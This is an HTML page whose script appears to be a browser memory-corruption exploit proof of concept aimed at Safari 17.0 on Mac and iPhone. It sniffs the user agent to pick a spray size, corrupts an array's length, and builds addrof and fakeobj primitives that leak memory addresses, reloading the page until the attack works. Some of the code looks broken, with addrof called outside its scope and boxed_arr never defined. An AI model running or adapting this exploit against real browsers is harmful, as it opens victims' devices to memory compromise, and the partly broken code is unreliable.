<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <script src="util.js"></script>
    <script src="int64.js"></script>
    <title>Document</title>
</head>
<body>
    <p id="factors">
    </p>
    <p id="status"></p>
    <script>

        function heapGrooming() {
            let groomedObjects = [];
            for (let i = 0; i < 10000; i++) {
                groomedObjects.push({});
            }
            return groomedObjects;
        }

        function getInfoLeak() {
            let [getter, getterSetter] = trigger();
            let leakedInfo = [];

            for (let i = 0; i < 100; i++) {
                leakedInfo.push(addrof({}));
            }

            return leakedInfo;
        }

        function exploit() {
            let groomedObjects = heapGrooming();
            let leakedInfo = getInfoLeak();
            for (let i = 0; i < leakedInfo.length; i++) {
                console.log("Leaked address: " + leakedInfo[i].toString());
            }
        }

        (function pwn() {
            let [getter, getterSetter] = trigger();
            let success = false;
            try {
                getterSetter.toString();
            } catch(e) {
                // it should fail to call toString
                success = true;
            }
            if (!success) {
                document.getElementById("status").innerHTML = "Exploit failed.. Trying again!"
                location.reload()
                return;
            }

            let symbolObject = Object(getterSetter);

            let isMac = navigator.userAgent.indexOf('Macintosh;') !== -1;
            let isIphone = navigator.userAgent.indexOf('iPhone;') !== -1;
            let version = navigator.userAgent.split('Version/')[1].split(' ')[0];
            let factor;
            let unknown_device = false;

            if (isMac && version == '17.0') {
                factor = 840;
            } else if (isIphone && version == '17.0') {
                factor = 87;
            } else {
                factor = 87 + Math.floor(Math.random() * 1000);
                unknown_device = true;
            }

            let ref_arr = [];
            for (let i = 0; i < factor; ++i) {
                ref_arr.push(symbolObject.description);
            }

            getter.p13 = 1.1; // change the length of boxed_arr
            let unboxed_arr = getter;
            
            function addrof(o) {
                boxed_arr[8] = o;
                return Int64.fromDouble(unboxed_arr[0]);
            }

            function fakeobj(addr) {
                unboxed_arr[0] = addr.asDouble();
                return boxed_arr[8];
            }
            
            let sample = BigInt(addrof({}).toString());
            if (sample >= 0x200000000 || sample < 0x100000000) {
                // alert('failed');
                location.reload();
                return;
            } else {
                alert(`success!!!`);
                if (unknown_device) {
                    alert(`It seems you have found a valid factor for an untested device!\nIf you send this information to me, it could be helpful to others.\nisMac: ${isMac}, isiPhone: ${isIphone}, version: ${version}, factor: ${factor}, userAgent: ${navigator.userAgent}`);
                    document.getElementById("status").innerHTML = "Success!"
                }
            }

            alert(addrof({}).toString());
            alert(addrof({}).toString());
            alert(addrof({}).toString());
            alert(addrof({}).toString());
            exploit(); // Call your exploit function
        })();

    </script>
</body>
</html>
